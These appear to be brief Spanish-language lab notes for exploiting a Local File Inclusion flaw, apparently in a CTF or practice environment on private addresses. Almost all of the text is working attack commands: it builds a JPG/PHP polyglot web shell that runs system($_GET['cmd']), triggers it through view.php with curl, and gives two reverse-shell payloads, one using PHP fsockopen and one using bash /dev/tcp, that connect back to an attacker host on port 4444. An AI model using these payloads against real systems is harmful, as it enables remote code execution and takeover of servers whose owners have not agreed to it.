# Ejemplo PDF

https://pdfobject.com/pdf/sample.pdf

# Local File Inclusion

cp eii.jpg polyglot.jpg 
printf "\n<?php system(\$_GET['cmd']); ?>\n" >> polyglot.jpg
mv polyglot.jpg shell_polyglot.php.jpg 
file shell_polyglot.php.jpg # Comprobamos el tipo de archivo

curl -s "http://172.31.0.90/view.php?page=uploads/shell_polyglot.php.jpg&cmd=id" | strings | grep -iE "uid=|gid=" 

# Probamos a subir un fichero sin el ruido de la imagen

cat > lfi_payload.php.jpg <<'EOF' 
<?php 
echo "BEGIN\n"; 
system($_GET['cmd'] ?? 'id'); 
echo "\nEND\n"; 
?> 
EOF 

# Reverse shell

http://172.31.0.90/view.php?page=uploads/lfi_payload.php.jpg&cmd=php -r '$s=fsockopen("172.31.0.10",4444); fwrite($s,"TEST\n");' 

http://172.31.0.90/view.php?page=uploads/lfi_payload.php.jpg&cmd=bash -c 'bash -i >& /dev/tcp/172.31.0.10/4444 0>&1' 



